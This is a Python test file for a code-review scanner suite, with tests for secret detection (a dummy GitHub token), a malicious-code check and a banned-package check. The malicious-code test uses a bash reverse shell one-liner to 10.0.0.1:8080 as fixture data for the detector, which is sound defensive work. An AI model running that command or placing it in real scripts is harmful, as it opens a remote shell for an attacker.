from analysis.secret_scanner import scan_for_secrets
from analysis.malicious_scanner import scan_for_malicious
from analysis.sca_scanner import scan_for_sca

def test_secret_scanner_finds_github_pat(mock_diff_chunk):
    chunk = mock_diff_chunk(
        added_lines=["export GITHUB_TOKEN=ghp_123456789012345678901234567890123456"]
    )
    findings = scan_for_secrets(chunk)
    assert len(findings) > 0
    assert "CRITICAL" in findings[0]
    assert "GitHub Personal Access Token" in findings[0]

def test_secret_scanner_ignores_safe_line(mock_diff_chunk):
    chunk = mock_diff_chunk(
        added_lines=["print('This is a safe line')"]
    )
    findings = scan_for_secrets(chunk)
    assert len(findings) == 0

def test_malicious_scanner_finds_reverse_shell(mock_diff_chunk):
    # This depends on malicious_compliance.json having a rule for /bin/bash -i or similar
    chunk = mock_diff_chunk(
        file_path="script.sh",
        added_lines=["bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"]
    )
    findings = scan_for_malicious(chunk)
    assert len(findings) > 0

def test_sca_scanner_finds_banned_package(mock_diff_chunk):
    # This depends on sca_compliance.json having rules
    chunk = mock_diff_chunk(
        file_path="requirements.txt",
        content="requests==2.25.1\ntelnetlib3==1.0.1"
    )
    # Note: sca_scanner uses chunk.content for manifest files
    findings = scan_for_sca(chunk)
    # We'll assume telnetlib3 or similar is in the compliance file
    # If not, this test might need adjustment based on sca_compliance.json content
    assert isinstance(findings, list)
